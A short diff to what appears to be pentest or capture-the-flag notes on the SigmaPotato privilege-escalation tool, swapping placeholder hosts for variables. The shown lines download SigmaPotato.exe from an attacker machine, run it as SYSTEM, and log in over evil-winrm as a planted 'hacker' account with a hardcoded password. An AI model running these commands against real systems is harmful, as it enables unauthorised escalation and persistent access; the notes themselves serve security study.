@@ -18,7 +18,7 @@
 
 ```powershell
 # Deliver to target
-iwr -uri http://<kali-ip>/SigmaPotato.exe -OutFile SigmaPotato.exe
+iwr -uri http://$LocalIP/SigmaPotato.exe -OutFile SigmaPotato.exe
 
 # Run command as SYSTEM
 .\SigmaPotato.exe "whoami"
@@ -31,7 +31,7 @@ net user hacker
 
 Then connect back with admin privileges:
 ```bash
-evil-winrm -i <target-ip> -u hacker -p Passw0rd!
+evil-winrm -i $BoxIP -u hacker -p Passw0rd!
 ```
 
 ## vs JuicyPotato
